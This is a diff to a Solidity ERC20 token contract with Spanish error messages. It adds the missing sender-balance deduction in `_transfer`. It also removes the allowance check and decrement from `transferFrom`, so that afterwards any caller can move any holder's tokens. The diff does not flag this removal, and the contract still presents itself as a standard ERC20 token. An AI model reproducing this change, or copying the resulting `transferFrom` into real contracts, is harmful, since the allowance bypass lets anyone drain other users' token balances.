@@ -51,7 +51,6 @@ contract ERC20 is Context, IERC20 {
     }
     function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: el monto de la transferencia excede la asignacion"));
         return true;
     }
     function increaseAllowance(address spender, uint addedValue) public returns (bool) {
@@ -62,13 +61,16 @@ contract ERC20 is Context, IERC20 {
         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: disminucion de la asignacion por debajo de cero"));
         return true;
     }
+
     function _transfer(address sender, address recipient, uint amount) internal {
         require(sender != address(0), "ERC20: transferencia desde la direccion cero");
         require(recipient != address(0), "ERC20: transferir a la direccion cero");
 
+        _balances[sender] = _balances[sender].sub(amount, "ERC20: el monto de la transferencia excede el saldo");
         _balances[recipient] = _balances[recipient].add(amount);
         emit Transfer(sender, recipient, amount);
     }
+
     function _mint(address account, uint amount) internal {
         require(account != address(0), "ERC20: agente a la direccion cero");
 
